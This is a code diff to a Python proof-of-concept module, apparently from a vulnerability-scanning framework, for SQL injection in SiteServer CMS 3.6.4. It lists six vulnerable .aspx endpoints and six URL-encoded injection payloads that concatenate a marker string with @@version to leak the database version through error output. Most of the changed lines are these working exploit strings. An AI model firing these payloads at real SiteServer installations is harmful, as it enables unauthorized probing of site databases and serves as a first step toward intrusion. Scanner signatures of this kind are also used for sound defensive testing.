@@ -5,18 +5,24 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'siteserver_0009' # 平台漏洞编号，留空
-    name = 'siteserver最新版3.6.4 SQL注入三' # 漏洞名称
+    vuln_id = 'SiteServer_0009' # 平台漏洞编号，留空
+    name = 'SiteServer最新版3.6.4 SQL注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2013-02-03'  # 漏洞公布时间
     desc = '''
-        
+        SiteServer最新版3.6.4 存在多处SQL注入漏洞：
+        /siteserver/service/background_taskLog.aspx
+        /usercenter/platform/user.aspx
+        /siteserver/bbs/background_keywordsFilting.aspx
+        /siteserver/userRole/background_administrator.aspx
+        /siteserver/userRole/background_user.aspx
+        /siteserver/bbs/background_thread.aspx
     ''' # 漏洞描述
     ref = '' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
-    product = 'siteserver'  # 漏洞应用名称
+    cnvd_id = 'Unknown' # cnvd漏洞编号
+    cve_id = 'Unknown' #cve编号
+    product = 'SiteServer'  # 漏洞应用名称
     product_version = '3.6.4'  # 漏洞应用版本
 
 
@@ -34,12 +40,12 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             ps=[
-                'siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&DateFrom=&DateTo=&IsSuccess=All',
-                'usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--',
-                'siteserver/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271',
-                'siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName',
-                'siteserver/userRole/background_user.aspx?PageNum=0&Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0',
-                'siteserver/bbs/background_thread.aspx?UserName=test&Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&DateFrom=&DateTo=&ForumID=0',
+                '/siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&DateFrom=&DateTo=&IsSuccess=All',
+                '/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--',
+                '/siteserver/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271',
+                '/siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName',
+                '/siteserver/userRole/background_user.aspx?PageNum=0&Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0',
+                '/siteserver/bbs/background_thread.aspx?UserName=test&Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&DateFrom=&DateTo=&ForumID=0',
                 ]
             for p in ps:
                 url=arg+p
